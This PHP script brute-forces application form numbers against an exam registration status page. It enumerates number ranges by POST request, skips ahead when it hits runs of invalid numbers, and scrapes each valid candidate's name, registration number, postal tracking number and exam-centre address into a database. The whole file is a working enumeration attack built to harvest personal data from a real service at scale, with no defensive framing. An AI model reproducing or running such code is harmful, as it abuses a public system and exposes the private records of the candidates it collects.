<?php
require 'HTTP/Request2.php';
require '../functions.php';
/**
 * A little analysis reveals the second digit to be the "zone"
 * in the application form numbers
 * The first four numbers are the most significant
 * However, nothing is getting accepted with over 3
 * in any of the places
 * Brute forcing to see what is possible
 *
 * Update: Its not the second digit, but the first two digits combined.
 * This script bruteforces the regnostatus.php
 * to check the validity of the registration numbers
 *
 * REG_NO = C[11-17|21-27][1-3][0-9]{5}
 */
$invalid_count = 0;
$i=isset($argv[1])? $argv[1] : 11;
for($j=3;$j<5;$j++)
	for($k=1;$k<100000;$k++){
		/**
		 * The variables are still i,j,k as i have
		 * no idea what they stand for
		 */
		$k=str_pad($k,5,0,STR_PAD_LEFT);
		$application_form_no =  "C".$i.$j.$k;
		
		//first search it in database
		$results = R::find('candidate',' form_no = ?', array( $application_form_no ));
		if(count($results))
			continue;
		//Make the request to the server
		$request = new HTTP_Request2('http://jee.iitr.ernet.in/regnostatus.php');
		$request->setMethod(HTTP_Request2::METHOD_POST)
				->addPostParameter('appno', $application_form_no);
		$body = $request->send()->getBody();
		$data = cut_str($body,"<center>","</center>");
		
		
		if(strpos($data,"invalid") !==false){
			echo $application_form_no ." - INVALID\n";
			$invalid_count++;
			//if the registration number was invalid
		}
		elseif(strpos($data,"has not been received") !== false){
			echo $application_form_no. " - NOT RECIEVED\n";
			$invalid_count++;
		}
		elseif(strpos($data,"cancelled") !== false){
			echo $application_form_no. " - CANCELLED\n";
			$invalid_count++;
		}
		else{
			$candidate = R::dispense('candidate');
			$candidate->name = cut_str($data,"Name              : ","<br>");
			
			//for debugging non-recieved forms
			if(!$candidate->name)
				{echo $body;exit;}
			
			$candidate->reg_no = cut_str($data,"Number is :  ","<br>");
			$candidate->tracking = cut_str($data,"articlenumber=",">");
			if(strlen($candidate->tracking)!=13) $candidate->tracking='';
			$candidate->form_no = $application_form_no;
			$candidate->center_address = trim(str_replace("<br>","\n",cut_str($data,"Centre is :<br>","<font")));
			R::store($candidate);
			echo $application_form_no. " - SAVED\n";
		}
		if($invalid_count == 10){
			echo "Skipping...\n";
			$invalid_count = 0;
			$k+=1000;
			$k = $k-$k%1000;//round to nearest 1000
		}
	}
